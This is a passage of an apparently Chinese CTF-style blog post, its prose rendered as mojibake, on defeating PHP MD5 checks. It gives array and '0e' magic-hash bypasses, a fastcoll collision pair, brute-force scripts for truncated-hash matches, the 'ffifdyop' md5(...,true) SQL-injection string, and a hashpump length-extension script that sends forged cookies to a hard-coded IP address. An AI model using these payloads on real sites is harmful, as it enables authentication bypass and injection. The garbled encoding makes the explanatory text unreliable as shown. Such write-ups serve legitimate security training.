class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br>	&#123;<br>		<span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])))<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•ä¸€ï¼šæ•°ç»„ç»•è¿‡</strong></p>
<p>ç”±äºmd5ä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œåœ¨åŠ å¯†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å›NULLï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¼ å…¥ä¸¤ä¸ªæ•°ç»„æ¥ç»•è¿‡</p>
<p><strong>æ–¹æ³•äºŒï¼šç§‘å­¦è®¡æ•°æ³•ç»•è¿‡</strong></p>
<p>å¯ä»¥ä¼ å…¥ä¸¤ä¸ªmd5åŠ å¯†åæ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œè¿™ä¸ªä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²åªèƒ½æ˜¯çº¯æ•°å­—ï¼Œè¿™æ ·phpåœ¨è¿›è¡Œç§‘å­¦è®¡ç®—æ³•çš„æ—¶å€™æ‰ä¼šå°†å®ƒè½¬åŒ–ä¸º0</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">s878926199a<br>0e545993274517709034328855841020<br><br>s155964671a<br>0e342768416822451524974117254469<br><br>s214587387a<br>0e848240448830537924465865611904<br><br>QLTHNDT<br>0e405967825401955372549139051580<br><br>QNKCDZO<br>0e830400451993494058024219903391<br><br>EEIZDOI<br>0e782601363539291779881938479162<br><br>240610708<br>0e462097431906509019562988736854<br></code></pre></td></tr></table></figure>


<h1 id="MD5å¼ºç±»å‹æ¯”è¾ƒ"><a href="#MD5å¼ºç±»å‹æ¯”è¾ƒ" class="headerlink" title="MD5å¼ºç±»å‹æ¯”è¾ƒ"></a>MD5å¼ºç±»å‹æ¯”è¾ƒ</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br>	&#123;<br>		<span class="hljs-keyword">if</span> ((<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>])))<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ok&quot;</span>;<br>		<span class="hljs-keyword">else</span><br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>åœ¨<code>===</code>çš„æƒ…å†µä¸‹å¦‚æœæ²¡æœ‰åŠ ç±»ä¼¼<code>is_numeric</code>çš„å‡½æ•°è¿›è¡Œè¿‡æ»¤è¿˜æ˜¯å¯ä»¥ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯ä¸èƒ½ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡äº†</p>
<p><strong>æ–¹æ³•ä¸‰ï¼šMD5å¼ºç¢°æ’</strong></p>
<p>å¯ä»¥ä½¿ç”¨<code>fastcoll</code>æ¥ç¢°æ’å‡ºä¸€ç»„å†…å®¹ä¸åŒä½†md5å€¼ç›¸åŒçš„å€¼</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2<br></code></pre></td></tr></table></figure>

<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2<br></code></pre></td></tr></table></figure>

<p><img src="/img/summary/md5-1.png"></p>
<h1 id="åŒMD5"><a href="#åŒMD5" class="headerlink" title="åŒMD5"></a>åŒMD5</h1><p>MD5å’ŒåŒMD5ä»¥åçš„å€¼éƒ½æ˜¯0eå¼€å¤´çš„</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM<br></code></pre></td></tr></table></figure>

<h1 id="md5-x3D-x3D-md5-md5"><a href="#md5-x3D-x3D-md5-md5" class="headerlink" title="$md5&#x3D;&#x3D;md5($md5)"></a>$md5&#x3D;&#x3D;md5($md5)</h1><figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">$md5          md5($md5)<br>0e00275209979 0e551387587965716321018342879905<br>0e00506035745 0e224441551631909369101555335043<br>0e00540451811 0e057099852684304412663796608095<br>0e00678205148 0e934049274119262631743072394111<br>0e00741250258 0e899567782965109269932883593603<br>0e00928251504 0e148856674729228041723861799600<br>0e01350016114 0e769018222125751782256460324867<br>0e01352028862 0e388419153010508575572061606161<br>0e01392313004 0e793314107039222217518920037885<br>0e01875552079 0e780449305367629893512581736357<br>0e01975903983 0e317084484960342086618161584202<br>0e02042356163 0e335912055437180460060141819624<br>0e02218562930 0e151492820470888772364059321579<br>0e02451355147 0e866503534356013079241759641492<br>0e02739970294 0e894318228115677783240047043017<br>0e02760920150 0e413159393756646578537635311046<br>0e02784726287 0e433955189140949269100965859496<br>0e03298616350 0e851613188370453906408258609284<br>0e03393034171 0e077847024281996293485700020358<br></code></pre></td></tr></table></figure>

<p>çˆ†ç ´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf8 -*-</span><br><span class="hljs-keyword">import</span> hashlib<br>payload = <span class="hljs-string">&quot;0123456789&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calcMd5</span>(<span class="hljs-params">s</span>):<br>    MD5 = hashlib.md5(s).hexdigest()<br>    <span class="hljs-keyword">if</span> MD5[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>] == <span class="hljs-string">&quot;0e&quot;</span> <span class="hljs-keyword">and</span> MD5[<span class="hljs-number">2</span>:<span class="hljs-number">32</span>].isdigit():<br>        <span class="hljs-built_in">print</span> s,MD5<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">payload,s,slen</span>):<br>    <span class="hljs-comment">#print &#x27;.&#x27;,</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(s) == slen:<br>        <span class="hljs-comment">#Custom string</span><br>        calcMd5(s)<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(payload)):<br>        sl= s+payload[j]<br>        getStr(payload,sl,slen)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    getStr(payload,<span class="hljs-string">&#x27;0e&#x27;</span>,<span class="hljs-number">13</span>)<br></code></pre></td></tr></table></figure>

<h1 id="æˆªæ–­æ¯”è¾ƒ-æš´åŠ›ç ´è§£"><a href="#æˆªæ–­æ¯”è¾ƒ-æš´åŠ›ç ´è§£" class="headerlink" title="æˆªæ–­æ¯”è¾ƒ(æš´åŠ›ç ´è§£)"></a>æˆªæ–­æ¯”è¾ƒ(æš´åŠ›ç ´è§£)</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;auth&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>) == <span class="hljs-string">&quot;666666&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;2&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>ä»£ç ä¸­éœ€è¦md5åå‰6ä½ä¸º<code>666666</code><br>å¯ä»¥é€šè¿‡è„šæœ¬è¿›è¡Œçˆ†ç ´<br>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br><br><br>CHARS = string.letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp_md5</span>(<span class="hljs-params">substr, stop_event, str_len, start=<span class="hljs-number">0</span>, size=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-keyword">global</span> CHARS<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        rnds = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))<br>        md5 = hashlib.md5(rnds)<br><br>        <span class="hljs-keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:<br>            <span class="hljs-built_in">print</span> rnds<br>            stop_event.<span class="hljs-built_in">set</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    substr = sys.argv[<span class="hljs-number">1</span>].strip()<br><br>    start_pos = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br><br>    str_len = <span class="hljs-built_in">len</span>(substr)<br>    cpus = multiprocessing.cpu_count()<br>    stop_event = multiprocessing.Event()<br>    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,<br>                                         stop_event, str_len, start_pos))<br>                 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cpus)]<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.start()<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.join()<br></code></pre></td></tr></table></figure>
<p>è¿è¡Œè„šæœ¬<br>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯éœ€è¦çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä»å“ªä¸€ä½å¼€å§‹<br><img src="/img/summary/md5-2.png"><br>éªŒè¯<br><img src="/img/summary/md5-3.png"></p>
<hr>
<p>è¡¥å……ä¸€ä¸ªå‡çº§ç‰ˆè„šæœ¬ï¼Œæ”¯æŒå°¾éƒ¨æ·»åŠ å­—ç¬¦ä¸²<br>ä¾‹å­ï¼š<br>å‡è®¾å­—ç¬¦ä¸²æ˜¯éšæœºçš„ï¼ˆæŒ‡<code>12ba</code>å’Œ<code>91e0c</code>ï¼‰</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;auth&#x27;</span>].<span class="hljs-string">&quot;12ba&quot;</span>),<span class="hljs-number">0</span>,<span class="hljs-number">5</span>) == <span class="hljs-string">&quot;91e0c&quot;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;2&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">&gt;python2 md5.py <span class="hljs-string">&quot;91e0c&quot;</span> <span class="hljs-number">0</span> <span class="hljs-number">12</span>ba<br><span class="hljs-number">1</span>KVErD6VijQCd9BrkPEl                 <span class="hljs-regexp">//</span>è·‘å‡ºçš„å€¼ï¼Œå·²ç»å»é™¤ç»“å°¾<br></code></pre></td></tr></table></figure>

<p>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> multiprocessing<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> sys<br><br><br>CHARS = string.letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmp_md5</span>(<span class="hljs-params">substr, stop_event, str_len,off, start=<span class="hljs-number">0</span>, size=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-keyword">global</span> CHARS<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> stop_event.is_set():<br>        rnds = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(size))<br>        rnds1 =rnds+ off<br>        md5 = hashlib.md5(rnds1)<br><br>        <span class="hljs-keyword">if</span> md5.hexdigest()[start: start+str_len] == substr:<br>            <span class="hljs-built_in">print</span>( rnds)<br>            stop_event.<span class="hljs-built_in">set</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    substr = sys.argv[<span class="hljs-number">1</span>].strip()<br><br>    start_pos = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    off=sys.argv[<span class="hljs-number">3</span>]<br>    str_len = <span class="hljs-built_in">len</span>(substr)<br>    cpus = multiprocessing.cpu_count()<br>    stop_event = multiprocessing.Event()<br>    processes = [multiprocessing.Process(target=cmp_md5, args=(substr,<br>                                         stop_event, str_len,off, start_pos))<br>                 <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cpus)]<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.start()<br><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> processes:<br>        p.join()<br></code></pre></td></tr></table></figure>

<h1 id="ä¸åŒæ–‡ä»¶ç›¸åŒmd5"><a href="#ä¸åŒæ–‡ä»¶ç›¸åŒmd5" class="headerlink" title="ä¸åŒæ–‡ä»¶ç›¸åŒmd5"></a>ä¸åŒæ–‡ä»¶ç›¸åŒmd5</h1><p>linuxä½¿ç”¨md5collgenç¢°æ’ç”Ÿæˆä¸¤ä¸ªmd5å€¼ç›¸åŒä½†å†…å®¹ä¸åŒçš„æ–‡ä»¶</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">md5collgen</span> -o <span class="hljs-number">1</span>.bin <span class="hljs-number">2</span>.bin<br></code></pre></td></tr></table></figure>

<p>windowså¯ä»¥ä¸‹è½½fastcollï¼Œç¢°æ’ç”Ÿæˆä¸¤ä¸ªmd5å€¼ç›¸åŒä½†å†…å®¹ä¸åŒçš„æ–‡ä»¶</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">fastcoll<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">123</span><span class="hljs-selector-class">.txt</span> -o <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> <span class="hljs-number">2</span><span class="hljs-selector-class">.txt</span><br>fastcoll<span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.jpg</span> -o <span class="hljs-number">1</span><span class="hljs-selector-class">.jpg</span> <span class="hljs-number">2</span>.jpg<br></code></pre></td></tr></table></figure>


<h1 id="phpä¸­md5-str-true-æ³¨å…¥"><a href="#phpä¸­md5-str-true-æ³¨å…¥" class="headerlink" title="phpä¸­md5($str,true)æ³¨å…¥"></a>phpä¸­md5($str,true)æ³¨å…¥</h1><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$link</span>,<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mysqli_num_rows</span>(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Success&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Failure&#x27;</span>;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬åªéœ€è¦æ‰¾md5åŠ å¯†åå­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨<code>&#39;or&#39;</code>å­—ç¬¦ä¸²</p>
<p>æ¯”å¦‚ç»å…¸çš„<code>ffifdyop</code>ï¼Œç»è¿‡md5åŠ å¯†å<code>276f722736c95d99e921722cf9ed621c</code>ï¼Œè½¬å­—ç¬¦ä¸²åå°±åŒ…å«äº†<code>&#39;or&#39;</code></p>
<p><img src="/img/summary/md5-4.png"></p>
<p>å…¶ä»–çš„ä¾‹å­å’Œexp</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">ffifdyop<br>4SV7p<br>bJm4aG<br>bNas5p<br>ckHAEb<br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">calc_md5_true</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$md5_true</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$s</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$md5_true</span>,<span class="hljs-string">&quot;&#x27;or&#x27;&quot;</span>) !== <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>.PHP_EOL;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getstr</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span>, <span class="hljs-variable">$s</span>, <span class="hljs-variable">$slen</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>) == <span class="hljs-variable">$slen</span>) &#123;<br>        <span class="hljs-title function_ invoke__">calc_md5_true</span>(<span class="hljs-variable">$s</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>); <span class="hljs-variable">$i</span>++) &#123;<br><br>        <span class="hljs-variable">$sl</span> = <span class="hljs-variable">$s</span> . <span class="hljs-variable">$payload</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-title function_ invoke__">getstr</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-variable">$sl</span>, <span class="hljs-variable">$slen</span>);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//å­—ç¬¦ä¸²é•¿åº¦ä»3åˆ°30ï¼Œè‚¯å®šæ‰¾å¾—åˆ°</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">3</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">30</span>; <span class="hljs-variable">$i</span>++) &#123;<br>    <span class="hljs-title function_ invoke__">getstr</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$i</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="HASHé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#HASHé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="HASHé•¿åº¦æ‰©å±•æ”»å‡»"></a>HASHé•¿åº¦æ‰©å±•æ”»å‡»</h1><p>åœ¨<code>$hash = md5($salt.$data)</code>ä¸­å·²çŸ¥<code>$hash</code>å’Œ<code>$data</code>ä»¥åŠ<code>$salt</code>çš„é•¿åº¦æ—¶<br>å¯ä»¥æ‰¾åˆ°å¦ä¸€ä¸ª<code>$_hash</code>å’Œ<code>$_data</code>ä½¿å¾—<code>$_hash = md5($salt.$_data)</code>æˆç«‹</p>
<h2 id="å·²çŸ¥salté•¿åº¦"><a href="#å·²çŸ¥salté•¿åº¦" class="headerlink" title="å·²çŸ¥salté•¿åº¦"></a>å·²çŸ¥salté•¿åº¦</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>hashpump</code>è¿›è¡Œè®¡ç®—</p>
<p>ç¬¬ä¸€è¡Œæ˜¯å¾—åˆ°çš„hashå€¼ï¼Œå³hash(salt+â€™adminrootâ€™)<br>ç¬¬äºŒè¡Œæ˜¯å·²çŸ¥æ•°æ®ï¼Œå³â€™adminrootâ€™<br>ç¬¬ä¸‰è¡Œæ˜¯salté•¿åº¦<br>ç¬¬å››è¡Œæ˜¯è¦æ·»åŠ çš„æ•°æ®(è¿™ä¸ªéšæ„ï¼Œè‡³å°‘1ä½ä»¥ä¸Š)</p>
<p><img src="/img/summary/md5-5.png"></p>
<p><code>\x</code>æ›¿æ¢ä¸º<code>%</code></p>
<p><img src="/img/summary/md5-6.png"></p>
<hr>
<p>hashpumpçš„ä½œè€…åˆ åº“äº†ï¼Œå¯ä»¥ä½¿ç”¨<a href="https://github.com/shellfeel/hash-ext-attack">hash-ext-attack</a>æˆ–è€…hexpandä»£æ›¿</p>
<h2 id="æœªçŸ¥salté•¿åº¦"><a href="#æœªçŸ¥salté•¿åº¦" class="headerlink" title="æœªçŸ¥salté•¿åº¦"></a>æœªçŸ¥salté•¿åº¦</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">æ”»å‡»ä»£ç <br><br><span class="hljs-keyword">import</span> hashpumpy<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">30</span>):<br>	m=hashpumpy.hashpump(<span class="hljs-string">&#x27;3a4727d57463f122833d9e732f94e4e0&#x27;</span>,<span class="hljs-string">&#x27;;\&quot;tseug\&quot;:5:s&#x27;</span>,<span class="hljs-string">&#x27;;\&quot;nimda\&quot;:5:s&#x27;</span>,i)<br>	<span class="hljs-built_in">print</span> i<br>	url=<span class="hljs-string">&#x27;http://120.26.131.152:32778/&#x27;</span><br>	digest=m[<span class="hljs-number">0</span>]<br><br>	message=urllib.quote(urllib.unquote(m[<span class="hljs-number">1</span>])[::-<span class="hljs-number">1</span>])<br>	cookie=<span class="hljs-string">&#x27;role=&#x27;</span>+message+<span class="hljs-string">&#x27;; hsh=&#x27;</span>+digest<br>	<span class="hljs-comment">#print cookie</span><br>	headers=&#123;<br>	<span class="hljs-string">&#x27;cookie&#x27;</span>: cookie,<br>	<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;</span>,<br>	<span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,<br>	<span class="hljs-string">&#x27;Accept-Language&#x27;</span>: <span 